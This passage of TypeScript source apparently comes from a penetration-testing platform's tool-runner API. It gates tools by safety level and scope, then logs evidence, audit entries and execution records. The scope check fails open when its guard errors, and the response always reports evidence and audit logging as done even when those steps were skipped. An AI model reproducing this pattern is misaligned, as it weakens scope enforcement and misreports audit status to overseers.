      // 1. Safety check — validate the tool is allowed at the current safety level
      const toolDef = TOOL_REGISTRY.find(t => t.name === input.toolName);
      if (toolDef) {
        const engagement = await db.getEngagementById(input.engagementId);
        const safetyLevel = (engagement as any)?.safetyLevel || "standard";
        const SAFETY_ORDER = ["passive_only", "low_impact", "standard", "full_exploitation"];
        if (SAFETY_ORDER.indexOf(toolDef.safetyLevel) > SAFETY_ORDER.indexOf(safetyLevel)) {
          throw new TRPCError({
            code: "FORBIDDEN",
            message: `Tool "${input.toolName}" requires safety level "${toolDef.safetyLevel}" but engagement is at "${safetyLevel}"`,
          });
        }
      }

      // 2. ROE scope check — validate target is in scope
      if (input.target) {
        try {
          const { enforceROE } = await import("../lib/roe-guard");
          const roeResult = enforceROE(
            input.engagementId,
            input.target,
            toolDef?.tier === "active-aggressive" ? "exploit" : "scan",
            ctx.user.name || ctx.user.openId
          );
          if (!roeResult.allowed) {
            throw new TRPCError({
              code: "FORBIDDEN",
              message: `ROE violation: ${roeResult.reason}`,
            });
          }
        } catch (e: any) {
          if (e.code === "FORBIDDEN") throw e;
          // ROE guard may not be initialized — log but don't block
          console.warn("[ToolRunner] ROE guard check skipped:", e.message);
        }
      }

      // 3. Parse output into findings
      const findings = parseToolOutput(
        input.output,
        input.toolName,
        toolDef?.outputFormat || "text"
      );

      // 4. Log to evidence chain
      try {
        const { hashAndChainEvidence } = await import("../lib/evidence-integrity");
        const evidenceId = `tool-exec-${input.toolName}-${Date.now()}`;
        await hashAndChainEvidence(
          evidenceId,
          String(input.engagementId),
          JSON.stringify({
            tool: input.toolName,
            command: input.command,
            target: input.target,
            operator: ctx.user.name || ctx.user.openId,
            timestamp: new Date().toISOString(),
            exitCode: input.exitCode,
            findingsCount: findings.length,
          })
        );
      } catch (e: any) {
        console.warn("[ToolRunner] Evidence chain logging skipped:", e.message);
      }

      // 5. Log to audit trail
      try {
        const { logOffensiveAction } = await import("../lib/roe-guard");
        await logOffensiveAction({
          engagementId: input.engagementId,
          operator: ctx.user.name || ctx.user.openId,
          action: `manual_tool_execution`,
          target: input.target || "N/A",
          tool: input.toolName,
          details: `Command: ${input.command.substring(0, 200)}`,
          timestamp: new Date(),
          riskTier: toolDef?.tier === "active-aggressive" ? "red" : toolDef?.tier === "active-standard" ? "orange" : "yellow",
        });
      } catch (e: any) {
        console.warn("[ToolRunner] Audit logging skipped:", e.message);
      }

      // 6. Store execution record in DB
      const executionRecord = {
        engagementId: input.engagementId,
        toolName: input.toolName,
        command: input.command,
        target: input.target || null,
        output: input.output.substring(0, 50000), // Cap at 50KB
        exitCode: input.exitCode ?? null,
        durationMs: input.durationMs ?? null,
        findingsCount: findings.length,
        operator: ctx.user.name || ctx.user.openId,
        notes: input.notes || null,
        createdAt: new Date(),
      };

      // Try to insert into tool_executions table if it exists
      try {
        if ((schema as any).toolExecutions) {
          await dbConn.insert((schema as any).toolExecutions).values(executionRecord);
        }
      } catch {
        // Table may not exist yet — that's OK, we still return the findings
      }

      return {
        success: true,
        findingsIngested: findings.length,
        findings: findings.slice(0, 50), // Return first 50 for display
        evidenceLogged: true,
        auditLogged: true,
      };
    }),

  /** Get execution history for an engagement */
  getExecutionHistory: protectedProcedure
    .input(z.object({
      engagementId: z.number(),
      limit: z.number().optional().default(50),
    }))
    .query(async ({ input, ctx }) => {
      const dbConn = await db.getDb();
      if (dbConn) await assertEngagementAccess(dbConn, input.engagementId, ctx.user);

      // Try to read from DB, fall back to empty
      try {
        if (dbConn && (schema as any).toolExecutions) {
          const rows = await dbConn
            .select()
            .from((schema as any).toolExecutions)
            .where(eq((schema as any).toolExecutions.engagementId, input.engagementId))
            .orderBy(desc((schema as any).toolExecutions.createdAt))
            .limit(input.limit);
          return { executions: rows };
        }
      } catch { /* table may not exist */ }

      return { executions: [] };
    }),
});
